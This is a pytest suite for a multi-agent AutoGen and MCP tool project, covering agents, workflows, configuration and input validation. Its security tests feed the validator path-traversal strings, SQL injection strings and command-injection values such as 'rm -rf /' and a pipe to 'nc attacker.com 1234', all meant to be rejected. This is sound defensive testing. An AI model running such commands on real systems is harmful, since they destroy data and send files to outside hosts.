"""
Comprehensive White-Box Testing Suite
Tests all features, MCP servers, agents, and workflows

This test suite validates:
1. All 4 MCP Servers (GitHub, Filesystem, Memory, CodeBaseBuddy)
2. All 8 Agents (CodeAnalyzer, SecurityAuditor, Documentation, etc.)
3. All Workflows (quick_code_review, security_audit, deployment, etc.)
4. Security validation and input sanitization
5. Configuration loading and validation
6. Function registry and tool integration
7. Error handling and exception hierarchy
8. Memory system (short/medium/long-term)
9. Rate limiting and circuit breakers
10. Connection pooling and caching
"""

import asyncio
import json
import os
import tempfile
from pathlib import Path
from typing import Any, Dict
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest

# Import all components to test
from src.autogen_adapters.agent_factory import AutoGenAgentFactory
from src.autogen_adapters.conversation_manager import ConversationManager
from src.autogen_adapters.function_registry import FunctionRegistry
from src.autogen_adapters.groupchat_factory import GroupChatFactory
from src.exceptions import *
from src.mcp.tool_manager import MCPToolManager
from src.security.input_validator import InputValidator, validator

# =============================================================================
# TEST 1: MCP Server Testing
# =============================================================================


class TestMCPServers:
    """White-box testing for all MCP servers"""

    @pytest.fixture
    def mcp_config(self):
        """Mock MCP server configuration"""
        return {
            "mcp_servers": {
                "github": {
                    "enabled": True,
                    "port": 3000,
                    "server_url": "http://localhost:3000",
                    "timeout": 30,
                },
                "filesystem": {
                    "enabled": True,
                    "port": 3001,
                    "server_url": "http://localhost:3001",
                    "timeout": 10,
                    "allowed_paths": ["./workspace", "./test_data"],
                },
                "memory": {
                    "enabled": True,
                    "port": 3002,
                    "server_url": "http://localhost:3002",
                    "timeout": 5,
                },
                "codebasebuddy": {
                    "enabled": True,
                    "port": 3004,
                    "server_url": "http://localhost:3004",
                    "timeout": 60,
                },
            }
        }

    @pytest.mark.asyncio
    async def test_mcp_tool_manager_initialization(self, mcp_config):
        """Test MCPToolManager initializes all configured servers"""
        manager = MCPToolManager(config=mcp_config)

        # Verify configuration loaded
        assert manager.config is not None
        assert "mcp_servers" in manager.config

        # Verify tool registry has all tools
        registry_tools = manager.registry.get_all_tools()
        assert "github" in registry_tools
        assert "filesystem" in registry_tools
        assert "memory" in registry_tools
        assert "codebasebuddy" in registry_tools

    @pytest.mark.asyncio
    async def test_github_mcp_operations(self):
        """Test GitHub MCP server operations"""
        from src.mcp.github_tool import GitHubMCPTool

        config = {"server_url": "http://localhost:3000", "auth_token": "test_token", "timeout": 30}

        github_tool = GitHubMCPTool(server_url=config["server_url"], config=config)

        # Test available operations
        assert hasattr(github_tool, "execute")

        # Test operation validation
        operations = [
            "create_pr",
            "get_pr",
            "create_issue",
            "search_code",
            "get_file_contents",
            "get_commit",
        ]
        for op in operations:
            assert op  # Operations should be defined

    @pytest.mark.asyncio
    async def test_filesystem_mcp_security(self):
        """Test Filesystem MCP server path security"""
        from src.mcp.filesystem_tool import FilesystemMCPTool

        config = {
            "server_url": "http://localhost:3001",
            "allowed_paths": ["./workspace", "./test_data"],
            "blocked_patterns": [r"\.\.\/", r"\/etc\/", r"\.ssh\/"],
            "timeout": 10,
        }

        fs_tool = FilesystemMCPTool(server_url=config["server_url"], config=config)

        # Verify security configuration
        assert fs_tool.config.get("allowed_paths") is not None
        assert fs_tool.config.get("blocked_patterns") is not None

    @pytest.mark.asyncio
    async def test_memory_mcp_operations(self):
        """Test Memory MCP server storage and retrieval"""
        from src.mcp.memory_tool import MemoryMCPTool

        config = {
            "server_url": "http://localhost:3002",
            "storage_backend": "sqlite",
            "sqlite_path": "./data/test_memory.db",
            "timeout": 5,
        }

        memory_tool = MemoryMCPTool(server_url=config["server_url"], config=config)

        # Test memory operations
        operations = ["store", "retrieve", "search", "update", "delete"]
        for op in operations:
            assert op  # Operations should be defined

    @pytest.mark.asyncio
    async def test_codebasebuddy_mcp_operations(self):
        """Test CodeBaseBuddy MCP server semantic search"""
        from src.mcp.codebasebuddy_tool import CodeBaseBuddyMCPTool

        config = {
            "server_url": "http://localhost:3004",
            "index_path": "./data/test_codebase_index",
            "embedding_model": "all-MiniLM-L6-v2",
            "timeout": 60,
        }

        buddy_tool = CodeBaseBuddyMCPTool(server_url=config["server_url"], config=config)

        # Test semantic search operations
        operations = [
            "semantic_search",
            "find_similar_code",
            "get_code_context",
            "build_index",
            "find_usages",
        ]
        for op in operations:
            assert op  # Operations should be defined


# =============================================================================
# TEST 2: Agent Testing
# =============================================================================


class TestAgents:
    """White-box testing for all 8 agents"""

    @pytest.fixture
    def agent_factory(self):
        """Create agent factory for testing"""
        return AutoGenAgentFactory()

    def test_agent_factory_initialization(self, agent_factory):
        """Test agent factory loads all agent configurations"""
        assert agent_factory.agents_config is not None
        assert agent_factory.llm_configs is not None

        # Verify all agents are defined in config
        expected_agents = [
            "code_analyzer",
            "security_auditor",
            "documentation_agent",
            "deployment_agent",
            "research_agent",
            "project_manager",
            "executor",
            "user_proxy_executor",
        ]

        for agent_name in expected_agents:
            assert agent_name in agent_factory.agents_config

    def test_code_analyzer_agent_creation(self, agent_factory):
        """Test CodeAnalyzer agent (TeachableAgent) creation"""
        agent = agent_factory.create_agent("code_analyzer")

        assert agent is not None
        assert agent.name == "CodeAnalyzer"

        # Verify agent has required tools
        config = agent_factory.agents_config["code_analyzer"]
        assert "tools" in config
        assert "github" in config["tools"]
        assert "filesystem" in config["tools"]
        assert "codebasebuddy" in config["tools"]

    def test_security_auditor_agent_creation(self, agent_factory):
        """Test SecurityAuditor agent creation"""
        agent = agent_factory.create_agent("security_auditor")

        assert agent is not None
        assert agent.name == "SecurityAuditor"

        # Verify security-specific configuration
        config = agent_factory.agents_config["security_auditor"]
        system_message = config.get("system_message", "")
        assert "security" in system_message.lower()
        assert "owasp" in system_message.lower()

    def test_documentation_agent_creation(self, agent_factory):
        """Test DocumentationAgent creation"""
        agent = agent_factory.create_agent("documentation_agent")

        assert agent is not None
        assert agent.name == "DocumentationAgent"

    def test_deployment_agent_creation(self, agent_factory):
        """Test DeploymentAgent creation"""
        agent = agent_factory.create_agent("deployment_agent")

        assert agent is not None
        assert agent.name == "DeploymentAgent"

        # Verify deployment-specific tools
        config = agent_factory.agents_config["deployment_agent"]
        assert "slack" in config.get("tools", [])

    def test_research_agent_creation(self, agent_factory):
        """Test ResearchAgent creation"""
        agent = agent_factory.create_agent("research_agent")

        assert agent is not None
        assert agent.name == "ResearchAgent"

    def test_project_manager_agent_creation(self, agent_factory):
        """Test ProjectManager agent creation"""
        agent = agent_factory.create_agent("project_manager")

        assert agent is not None
        assert agent.name == "ProjectManager"

        # Project manager should have access to all tools
        config = agent_factory.agents_config["project_manager"]
        tools = config.get("tools", [])
        assert len(tools) >= 3  # Should have multiple tools

    def test_executor_agent_creation(self, agent_factory):
        """Test Executor (UserProxyAgent) creation"""
        agent = agent_factory.create_agent("executor")

        assert agent is not None
        assert agent.name == "Executor"

        # Verify it's a UserProxyAgent
        config = agent_factory.agents_config["executor"]
        assert config.get("agent_type") == "UserProxyAgent"

    def test_create_all_agents(self, agent_factory):
        """Test creating all agents at once"""
        with patch.object(agent_factory, "create_agent") as mock_create:
            mock_create.return_value = Mock()
            agent_factory.create_all_agents()

            # Should attempt to create all configured agents
            assert mock_create.call_count >= 6  # At least 6 main agents


# =============================================================================
# TEST 3: Workflow Testing
# =============================================================================


class TestWorkflows:
    """White-box testing for all workflows"""

    @pytest.fixture
    def conversation_manager(self):
        """Create conversation manager for testing"""
        with patch("src.autogen_adapters.conversation_manager.AutoGenAgentFactory"):
            with patch("src.autogen_adapters.conversation_manager.FunctionRegistry"):
                manager = ConversationManager()
                return manager

    def test_workflow_configuration_loading(self, conversation_manager):
        """Test all workflow configurations are loaded"""
        workflows = conversation_manager.workflow_configs

        expected_workflows = [
            "code_analysis",
            "security_audit",
            "documentation_generation",
            "deployment",
            "research",
            "quick_code_review",
            "quick_documentation",
            "comprehensive_feature_review",
        ]

        for workflow in expected_workflows:
            assert workflow in workflows, f"Workflow {workflow} not found"

    def test_quick_code_review_workflow(self, conversation_manager):
        """Test quick_code_review workflow configuration"""
        workflow = conversation_manager.workflow_configs.get("quick_code_review")

        assert workflow is not None
        assert workflow["type"] == "two_agent"
        assert "code_analyzer" in workflow["agents"]
        assert "user_proxy_executor" in workflow["agents"]
        assert "max_turns" in workflow

    def test_security_audit_workflow(self, conversation_manager):
        """Test security_audit workflow configuration"""
        workflow = conversation_manager.workflow_configs.get("security_audit")

        assert workflow is not None
        assert workflow["type"] == "group_chat"
        assert "termination_keywords" in workflow
        assert "SECURITY_AUDIT_COMPLETE" in workflow["termination_keywords"]

    def test_code_analysis_workflow(self, conversation_manager):
        """Test code_analysis workflow configuration"""
        workflow = conversation_manager.workflow_configs.get("code_analysis")

        assert workflow is not None
        assert workflow["type"] == "group_chat"
        assert workflow["max_turns"] >= 10

    def test_deployment_workflow(self, conversation_manager):
        """Test deployment workflow configuration"""
        workflow = conversation_manager.workflow_configs.get("deployment")

        assert workflow is not None
        assert workflow["type"] == "group_chat"
        assert workflow["human_input_required"] == True  # Safety check

    def test_research_workflow(self, conversation_manager):
        """Test research workflow configuration"""
        workflow = conversation_manager.workflow_configs.get("research")

        assert workflow is not None
        assert "depth" in str(workflow.get("message_variables", {}))

    def test_documentation_generation_workflow(self, conversation_manager):
        """Test documentation_generation workflow"""
        workflow = conversation_manager.workflow_configs.get("documentation_generation")

        assert workflow is not None
        assert workflow["type"] == "group_chat"

    def test_comprehensive_feature_review_workflow(self, conversation_manager):
        """Test comprehensive_feature_review (nested) workflow"""
        workflow = conversation_manager.workflow_configs.get("comprehensive_feature_review")

        assert workflow is not None
        assert workflow["type"] == "nested_chat"
        assert "child_conversations" in workflow
        assert len(workflow["child_conversations"]) >= 3


# =============================================================================
# TEST 4: Security Validation Testing
# =============================================================================


class TestSecurityValidation:
    """White-box testing for security validation"""

    @pytest.fixture
    def input_validator(self):
        """Create input validator instance"""
        return InputValidator()

    def test_path_traversal_detection(self, input_validator):
        """Test path traversal attack detection"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "workspace/../../../secrets",
            "./data/../../.ssh/id_rsa",
        ]

        for path in malicious_paths:
            with pytest.raises(ValidationError):
                input_validator.validate_path(path)

    def test_sql_injection_detection(self, input_validator):
        """Test SQL injection pattern detection"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1 UNION SELECT * FROM passwords",
        ]

        for sql_input in malicious_inputs:
            with pytest.raises(ValidationError):
                input_validator._default_validation(sql_input)

    def test_command_injection_detection(self, input_validator):
        """Test command injection detection"""
        malicious_commands = [
            "file.txt; rm -rf /",
            "data.csv && cat /etc/passwd",
            "output.log | nc attacker.com 1234",
            "test.sh `whoami`",
        ]

        for cmd in malicious_commands:
            with pytest.raises(ValidationError):
                input_validator._default_validation(cmd)

    def test_mcp_tool_parameter_validation(self, input_validator):
        """Test MCP tool parameter validation"""
        # Valid parameters
        valid_params = {"owner": "myorg", "repo": "myrepo", "title": "Fix bug", "pr_number": "123"}

        validated = input_validator.validate_mcp_tool_params("github", "create_pr", valid_params)
        assert validated is not None
        assert validated["owner"] == "myorg"

    def test_invalid_tool_name_rejection(self, input_validator):
        """Test invalid tool names are rejected"""
        with pytest.raises(ValidationError):
            input_validator.validate_mcp_tool_params("malicious_tool", "operation", {})

    def test_invalid_operation_name_rejection(self, input_validator):
        """Test invalid operation names are rejected"""
        with pytest.raises(ValidationError):
            input_validator.validate_mcp_tool_params("github", "DROP_TABLE", {})

    def test_workflow_parameter_validation(self, input_validator):
        """Test workflow parameter validation"""
        valid_params = {
            "code_path": "./src/main.py",
            "focus_areas": "security, performance",
            "scope": "full",
            "environment": "production",
        }

        validated = input_validator.validate_parameters(valid_params)
        assert validated is not None
        assert all(k in validated for k in valid_params.keys())

    def test_parameter_length_limits(self, input_validator):
        """Test parameter length limits are enforced"""
        long_string = "A" * 2000  # Exceeds MAX_PARAM_LENGTH

        with pytest.raises(ValidationError):
            input_validator.validate_parameter_value("code_path", long_string)

    def test_allowed_values_enforcement(self, input_validator):
        """Test allowed values are enforced"""
        # Valid value
        validated = input_validator.validate_parameter_value("scope", "full")
        assert validated == "full"

        # Invalid value
        with pytest.raises(ValidationError):
            input_validator.validate_parameter_value("scope", "invalid_scope")


# =============================================================================
# TEST 5: Exception Hierarchy Testing
# =============================================================================


class TestExceptionHierarchy:
    """White-box testing for standardized exception hierarchy"""

    def test_base_exception_attributes(self):
        """Test base exception has all required attributes"""
        error = AutoGenAssistantError("Test error", error_code="TEST_001", details={"key": "value"})

        assert error.message == "Test error"
        assert error.error_code == "TEST_001"
        assert error.details == {"key": "value"}

    def test_exception_to_dict(self):
        """Test exception can be serialized to dict"""
        error = AutoGenAssistantError(
            "Test error", error_code="TEST_001", details={"component": "test"}
        )

        error_dict = error.to_dict()
        assert error_dict["error_type"] == "AutoGenAssistantError"
        assert error_dict["message"] == "Test error"
        assert error_dict["error_code"] == "TEST_001"
        assert error_dict["details"]["component"] == "test"

    def test_configuration_errors(self):
        """Test configuration error hierarchy"""
        errors = [
            InvalidConfigError("Invalid config"),
            MissingConfigError("Missing config"),
            ConfigValidationError("Validation failed"),
        ]

        for error in errors:
            assert isinstance(error, ConfigurationError)
            assert isinstance(error, AutoGenAssistantError)

    def test_agent_errors(self):
        """Test agent error hierarchy"""
        errors = [
            AgentNotFoundError("Agent not found"),
            AgentInitializationError("Init failed"),
            AgentExecutionError("Execution failed"),
        ]

        for error in errors:
            assert isinstance(error, AgentError)
            assert isinstance(error, AutoGenAssistantError)

    def test_mcp_tool_errors(self):
        """Test MCP tool error hierarchy"""
        errors = [
            MCPConnectionError("Connection failed"),
            MCPTimeoutError("Timeout"),
            MCPAuthenticationError("Auth failed"),
            MCPOperationError("Operation failed"),
        ]

        for error in errors:
            assert isinstance(error, MCPToolError)
            assert isinstance(error, AutoGenAssistantError)

    def test_security_errors(self):
        """Test security error hierarchy"""
        errors = [
            ValidationError("Validation failed"),
            AuthenticationError("Auth failed"),
            AuthorizationError("Not authorized"),
            RateLimitError("Rate limit exceeded"),
            PathTraversalError("Path traversal"),
            InjectionError("Injection detected"),
        ]

        for error in errors:
            assert isinstance(error, SecurityError)
            assert isinstance(error, AutoGenAssistantError)


# =============================================================================
# TEST 6: Function Registry Testing
# =============================================================================


class TestFunctionRegistry:
    """White-box testing for function registry"""

    @pytest.fixture
    def function_registry(self):
        """Create function registry for testing"""
        return FunctionRegistry()

    def test_function_registry_initialization(self, function_registry):
        """Test function registry initializes correctly"""
        assert function_registry.function_schemas is not None
        assert function_registry.tool_configs is not None

    def test_tool_configurations_loaded(self, function_registry):
        """Test all tool configurations are loaded"""
        expected_tools = [
            "github_operations",
            "filesystem_operations",
            "memory_operations",
            "codebasebuddy_operations",
        ]

        for tool in expected_tools:
            assert tool in function_registry.tool_configs

    def test_github_functions_registered(self, function_registry):
        """Test GitHub functions are registered"""
        github_config = function_registry.tool_configs.get("github_operations")

        assert github_config is not None
        functions = github_config.get("functions", {})

        expected_functions = [
            "create_pull_request",
            "get_pull_request",
            "create_issue",
            "search_code",
            "get_file_contents",
        ]

        for func in expected_functions:
            assert func in functions

    def test_filesystem_functions_registered(self, function_registry):
        """Test Filesystem functions are registered"""
        fs_config = function_registry.tool_configs.get("filesystem_operations")

        assert fs_config is not None
        functions = fs_config.get("functions", {})

        expected_functions = ["read_file", "write_file", "list_directory", "search_files"]

        for func in expected_functions:
            assert func in functions

    def test_memory_functions_registered(self, function_registry):
        """Test Memory functions are registered"""
        memory_config = function_registry.tool_configs.get("memory_operations")

        assert memory_config is not None
        functions = memory_config.get("functions", {})

        expected_functions = ["store_memory", "retrieve_memory", "search_memory"]

        for func in expected_functions:
            assert func in functions

    def test_codebasebuddy_functions_registered(self, function_registry):
        """Test CodeBaseBuddy functions are registered"""
        buddy_config = function_registry.tool_configs.get("codebasebuddy_operations")

        assert buddy_config is not None
        functions = buddy_config.get("functions", {})

        expected_functions = [
            "semantic_code_search",
            "find_similar_code",
            "get_code_context",
            "build_code_index",
            "find_code_usages",
        ]

        for func in expected_functions:
            assert func in functions


# =============================================================================
# TEST 7: Configuration Loading Testing
# =============================================================================


class TestConfigurationLoading:
    """White-box testing for configuration loading"""

    def test_main_config_loading(self):
        """Test main config.yaml loads correctly"""
        from src.security.yaml_loader import safe_load_yaml

        config_path = Path("config/config.yaml")
        if config_path.exists():
            config = safe_load_yaml(config_path)

            assert config is not None
            assert "models" in config
            assert "mcp_servers" in config
            assert "agents" in config

    def test_agent_config_loading(self):
        """Test autogen_agents.yaml loads correctly"""
        from src.security.yaml_loader import safe_load_yaml

        config_path = Path("config/autogen_agents.yaml")
        if config_path.exists():
            config = safe_load_yaml(config_path)

            assert config is not None
            assert "llm_configs" in config
            assert "agents" in config

    def test_workflow_config_loading(self):
        """Test autogen_workflows.yaml loads correctly"""
        from src.security.yaml_loader import safe_load_yaml

        config_path = Path("config/autogen_workflows.yaml")
        if config_path.exists():
            config = safe_load_yaml(config_path)

            assert config is not None
            assert "workflows" in config

    def test_function_schemas_loading(self):
        """Test function_schemas.yaml loads correctly"""
        from src.security.yaml_loader import safe_load_yaml

        config_path = Path("config/function_schemas.yaml")
        if config_path.exists():
            config = safe_load_yaml(config_path)

            assert config is not None
            assert "tools" in config

    def test_model_configuration_unified(self):
        """Test model configuration is unified (OpenRouter)"""
        from src.security.yaml_loader import safe_load_yaml

        config_path = Path("config/config.yaml")
        if config_path.exists():
            config = safe_load_yaml(config_path)

            models = config.get("models", {})
            assert "openrouter" in models
            assert models["openrouter"]["enabled"] == True
            assert models["openrouter"]["default_model"] == "mistralai/devstral-2512:free"


# =============================================================================
# TEST 8: Rate Limiting and Circuit Breaker Testing
# =============================================================================


class TestRateLimitingAndCircuitBreaker:
    """White-box testing for rate limiting and circuit breakers"""

    def test_token_bucket_rate_limiter(self):
        """Test token bucket rate limiter"""
        from src.mcp.base_tool import TokenBucket

        bucket = TokenBucket(capacity=10.0, refill_rate=1.0)

        # Should be able to consume initial tokens
        assert bucket.consume(5.0) == True
        assert bucket.consume(5.0) == True

        # Should be empty now
        assert bucket.consume(1.0) == False

    def test_rate_limiter_integration(self):
        """Test rate limiter integrated with MCP tools"""
        from src.security.rate_limiter import RateLimiter

        limiter = RateLimiter(requests_per_minute=60, requests_per_hour=1000, burst_size=10)

        # Should allow requests within limits
        for i in range(10):
            assert limiter.allow_request() == True

    def test_circuit_breaker_states(self):
        """Test circuit breaker state transitions"""
        from src.security.circuit_breaker import CircuitBreaker

        breaker = CircuitBreaker(
            failure_threshold=5, recovery_timeout=10, expected_exception=Exception
        )

        # Should start in CLOSED state
        assert breaker.state == "CLOSED"


# =============================================================================
# TEST 9: Memory System Testing
# =============================================================================


class TestMemorySystem:
    """White-box testing for memory system"""

    @pytest.mark.asyncio
    async def test_memory_tiers(self):
        """Test three-tier memory system"""
        # Test that memory system has three tiers
        from src.security.yaml_loader import safe_load_yaml

        config_path = Path("config/config.yaml")
        if config_path.exists():
            config = safe_load_yaml(config_path)
            memory_config = config.get("memory", {})

            assert "short_term" in memory_config
            assert "medium_term" in memory_config
            assert "long_term" in memory_config

    def test_memory_ttl_configuration(self):
        """Test memory TTL settings"""
        from src.security.yaml_loader import safe_load_yaml

        config_path = Path("config/config.yaml")
        if config_path.exists():
            config = safe_load_yaml(config_path)
            memory_config = config.get("memory", {})

            # Short-term: 1 hour
            assert memory_config["short_term"]["ttl"] == 3600

            # Medium-term: 30 days
            assert memory_config["medium_term"]["ttl"] == 2592000

            # Long-term: permanent
            assert memory_config["long_term"]["ttl"] is None


# =============================================================================
# TEST 10: Integration Testing
# =============================================================================


class TestIntegration:
    """White-box integration testing"""

    @pytest.mark.asyncio
    async def test_agent_to_mcp_integration(self):
        """Test agent can access MCP tools"""
        with patch("src.autogen_adapters.agent_factory.AutoGenAgentFactory.create_agent"):
            factory = AutoGenAgentFactory()

            # Verify agent-to-tool mapping exists
            from src.mcp.tool_manager import AGENT_TOOL_MAPPING

            assert "code_analyzer" in AGENT_TOOL_MAPPING
            assert "github" in AGENT_TOOL_MAPPING["code_analyzer"]
            assert "filesystem" in AGENT_TOOL_MAPPING["code_analyzer"]

    def test_security_validation_integration(self):
        """Test security validation integrates with MCP manager"""
        config = {"mcp_servers": {}}
        manager = MCPToolManager(config=config)

        # Verify validator is accessible
        from src.security.input_validator import validator

        assert validator is not None

    def test_exception_handling_integration(self):
        """Test exception handling works across components"""
        # Test that exceptions can be caught and handled
        try:
            raise MCPConnectionError("Test connection error", error_code="MCP_001")
        except AutoGenAssistantError as e:
            assert e.error_code == "MCP_001"
            assert isinstance(e, MCPToolError)


# =============================================================================
# RUN ALL TESTS
# =============================================================================

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "--color=yes"])
